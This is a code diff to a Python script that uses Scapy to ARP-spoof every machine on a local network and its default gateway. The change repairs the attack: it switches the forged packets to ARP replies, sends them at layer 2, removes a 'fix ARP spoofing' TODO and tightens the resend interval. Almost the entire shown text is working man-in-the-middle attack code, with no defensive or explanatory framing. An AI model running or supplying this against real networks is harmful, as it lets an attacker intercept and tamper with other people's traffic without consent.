@@ -40,21 +40,21 @@ def getLocalAddrss():
 
 def arpSpoof(localAddresses,defaultGateway,localMAC):
     """
-    every 2 minutes send ARP broadcast to spoof all machines on LAN"""
+    every 30 seconds send ARP broadcast to spoof all machines on LAN"""
 
-    #TODO: fix ARP spoofing
     while True:
         for ip in localAddresses.keys():
             if ip != defaultGateway:
-                #create arp packet
-                victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=1, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
-                victimPacket.show()
-                gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=1,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
-                gatewayPacket.show()
-                send(victimPacket)
-                send(gatewayPacket)
+                #create arp packets
+                victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=2, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
+                #victimPacket.show()
+                gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
+                #gatewayPacket.show()
+                #send packets
+                sendp(victimPacket)
+                sendp(gatewayPacket)
 
-        time.sleep(60)
+        time.sleep(30)
 
 
 
